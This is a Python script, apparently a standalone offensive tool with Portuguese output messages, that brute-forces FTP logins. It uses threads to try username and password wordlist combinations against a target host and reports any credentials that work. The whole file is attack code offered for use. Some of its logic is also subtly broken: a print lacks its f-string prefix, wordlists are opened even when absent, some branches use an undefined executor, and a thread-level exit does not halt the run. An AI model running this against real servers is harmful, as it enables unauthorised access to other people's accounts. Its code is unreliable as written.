from ftplib import FTP
import argparse
import textwrap
import concurrent.futures
import sys

def connectFTP(host, login, password):
    
    ftp = FTP()
    try:
        ftp.connect(host)
        ftp.login(login, password)
        if ftp.getwelcome():
            print("\033[32m****[{host}] - {login}: {password}****\033[0m")
            print("Senha encontrada!")
            sys.exit(0)
    except Exception as e:
        print(f"\033[91m[{host}] - {login}: {password}\033[0m")

def openWordlist(path):
    with open(path, 'r', encoding='iso-8859-1') as file:
        return file.readlines()

class FtpBrute:
    def __init__(self, args):
        self.args = args
        self.target = self.args.target
        self.login = self.args.login
        self.password = self.args.password
        max_threads = int(self.args.threads)
        login_list = openWordlist(self.args.loginWordlist)
        password_list = openWordlist(self.args.passWordlist)
        print("\033[94m[*] Tentando conexão com alvo...\033[0m")

        if self.args.loginWordlist and self.args.passWordlist:       
            with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
                for login in login_list:
                    login = login.strip()
                    for password in password_list:
                        password = password.strip()
                        executor.submit(connectFTP, self.target, login, password)

        elif self.args.login and self.args.password:
            self.login = self.args.login
            self.password = self.args.password
            connectFTP(self.target, self.login, self.password)
        elif self.args.loginWordlist:
            for login in login_list:
                login = login.strip()
                executor.submit(connectFTP, self.target, login, self.password)
        elif self.args.passWordlist:
            for password in password_list:
                password = password.strip()
                executor.submit(connectFTP, self.target, self.login, password)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='FTP Brute Force Attack',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Example:
            python ftpbrute.py -t ftp.client.com -l anonymous -p anonymous -T 5
            python ftpbrute.py -t ftp.client.com -L user.txt -P password.txt -T 10
        '''))
    parser.add_argument('-t', '--target', required=True, help="Target host")
    parser.add_argument('-l', '--login', required=False, default='anonymous', help='Username')
    parser.add_argument('-L', '--loginWordlist', help='Path to a username wordlist')
    parser.add_argument('-p', '--password', required=False, default='anonymous', help='Password')
    parser.add_argument('-P', '--passWordlist', help='Path to a password wordlist')
    parser.add_argument('-T',"--threads",default=5, help='Threads')
    args = parser.parse_args()

    ftp_brute_force = FtpBrute(args)
